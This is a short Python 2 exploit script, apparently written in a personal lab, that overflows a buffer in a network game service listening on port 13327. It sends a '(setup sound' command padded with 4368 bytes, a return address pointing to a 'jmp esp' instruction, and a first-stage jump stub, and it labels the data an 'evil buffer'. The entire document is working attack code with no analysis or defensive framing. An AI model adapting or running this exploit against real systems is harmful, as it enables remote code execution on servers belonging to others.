#!/usr/bin/python
import socket

host="192.168.0.32"   # myLab
padding="\x41" * 4368 # A's
#eip="\x42\x42\x42\x42"  # B's 
eip="\x96\x45\x13\x08"  # opcode search for jmp esp 0x08134596
#first_stage="\x83\xc0\x0c\xff\xe0\x90\x90" # add eax 12 83c00c, jmp eax ff30
first_stage="\xff\xe0\x83\xc0\x0c\xff\xe0" # jmp eax ffe0, add eax 12 83c00c, jmp eax ffe0

buffer="\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."

s.connect((host,13327))
print s.recv(1024)

s.send(buffer)
s.close()

print "[*]Payload Sent !"

